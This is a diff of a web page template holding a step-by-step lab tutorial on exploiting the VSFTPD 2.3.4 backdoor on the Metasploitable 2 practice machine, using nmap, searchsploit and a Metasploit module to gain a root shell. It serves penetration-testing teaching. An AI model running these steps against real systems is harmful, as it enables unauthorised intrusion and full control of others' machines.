@@ -1,1 +1,140 @@
-<p>scen-one works!</p>
+<div class="card">
+  <div class="card-body">
+    <h5 class="card-title">{{cardTitle}}</h5>
+    <h6 class="card-subtitle mb-2 text-muted">{{cardSubtitle}}</h6>
+    <p class="card-text">
+      VSFTPD is a File Tranfer Protocol (FTP) server for systems based on UNIX.
+      VSFTP is the default FTP server in the Ubuntu, Fedore, CentOS, NimbleX, Slackware,
+      and RHEL Linux distributions. In this scenario, VSFTPD v2.3.4 might contain a backdoor that can be
+      exploited. The developers of this version of VSFTPD has since removed the package. However, many
+      people have downloaded this specific version and is not aware of the backdoor. 
+      
+      <br><br>
+      In this scenario, we will be exploiting this backdoor on the Metasploitable 2 virtual machine by using
+      a exploit in Metasploit known as vsftpd_234_backdoor.
+    </p>
+  </div>
+</div>
+
+<div class="accordion accordion-flush" id="accordionFlushExample">
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingOne">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseOne" aria-expanded="false" aria-controls="flush-collapseOne">
+          {{accOneTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseOne" class="accordion-collapse collapse" aria-labelledby="flush-headingOne" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>Run the nmap command in the terminal</h5> <br>
+          <h6>command: nmap -p- -sV "target machine's ip address"</h6>
+          <div class="text-center">
+            <img src="assets/scen_1/1.png" class="img-fluid" alt="...">
+          </div>
+          <p>
+            Once the command has finished running, nmap will provide a report on all the ports
+            that are open on the target machine. This allows the attacker to easily exploit a number of vulnerabilities
+            without searching manually for the vulnerabilities.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingTwo">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseTwo" aria-expanded="false" aria-controls="flush-collapseTwo">
+          {{accTwoTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseTwo" class="accordion-collapse collapse" aria-labelledby="flush-headingTwo" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>Run the searchsploit command in the terminal</h5> <br>
+          <h6>command: searchsploit vsftpd</h6>
+          <div class="text-center">
+            <img src="assets/scen_1/2.png" class="img-fluid" alt="...">
+          </div>
+          <p>
+            Searchsploit allows an user to search through the local repository of the machine
+            to check whether the exploit is installed on the machine locally.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingThree">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseThree" aria-expanded="false" aria-controls="flush-collapseThree">
+          {{accThreeTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseThree" class="accordion-collapse collapse" aria-labelledby="flush-headingThree" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>Run "msfconsole" and thereafer "use" in the terminal</h5><br>
+          <h6>command: msfconsole<br>
+              command: use exploit/unix/ftp/vsftp_234_backdoor
+          </h6>
+          <div class="text-center">
+            <img src="assets/scen_1/3.png" class="img-fluid" alt="...">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingTwo">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseFour" aria-expanded="false" aria-controls="flush-headingFour">
+          {{accFourTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseFour" class="accordion-collapse collapse" aria-labelledby="flush-headingFour" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>Run the set rhost command in the terminal</h5> <br>
+          <h6>command: set rhost "ip address of target machine obtained in Step 1"</h6>
+          <div class="text-center">
+            <img src="assets/scen_1/4.png" class="img-fluid" alt="...">
+          </div>
+          <p>
+            This command points the exploit to the target machine that will be exploited.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingTwo">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseFive" aria-expanded="false" aria-controls="flush-headingFive">
+          {{accFiveTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseFive" class="accordion-collapse collapse" aria-labelledby="flush-headingFive" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>Success. We have exploited the flaw</h5> <br>
+          <h6>command: ifconfig (indicates that we have ownership of the target machine's command prompt)</h6>
+          <div class="text-center">
+            <img src="assets/scen_1/5.png" class="img-fluid" alt="...">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion-item">
+      <h2 class="accordion-header" id="flush-headingTwo">
+        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseSix" aria-expanded="false" aria-controls="flush-headingSix">
+          {{accSixTitle}}
+        </button>
+      </h2>
+      <div id="flush-collapseSix" class="accordion-collapse collapse" aria-labelledby="flush-headingSix" data-bs-parent="#accordionFlushExample">
+        <div class="accordion-body">
+          <h5>End of Tutorial</h5> <br>
+          <h6>command: pwd (displays the current working directory)</h6>
+          <div class="text-center">
+            <img src="assets/scen_1/6.png" class="img-fluid" alt="...">
+          </div>
+          <p>
+            The exploit has given us root access to the target machine. From here we can modify, add and delete
+            any files on the target machine.
+          </p>
+        </div>
+      </div>
+    </div>
+      
+  </div>
